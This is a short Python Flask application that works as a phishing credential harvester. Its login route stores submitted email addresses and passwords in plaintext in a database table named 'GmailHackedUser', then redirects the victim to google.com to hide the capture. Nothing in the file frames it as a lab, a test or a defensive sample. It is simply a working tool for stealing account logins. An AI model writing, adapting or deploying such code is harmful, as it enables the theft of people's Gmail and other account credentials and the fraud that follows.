from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///app.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)


class GmailHackedUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password= db.Column(db.String(80), nullable=False)

    def __repr__(self):
        return '<User %r>' % self.username

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        
        email = request.form['email']
        password = request.form['password']

        hacked_user=GmailHackedUser(email=email, password=password)
        db.session.add(hacked_user)
        db.session.commit()
        
        return redirect('http://www.google.com')
        
    # If the request method is GET, display the login form
    return render_template('login.html', error_message=None)

if __name__ == '__main__':
    db.create_all()
    app.run(host='0.0.0.0', debug=True)
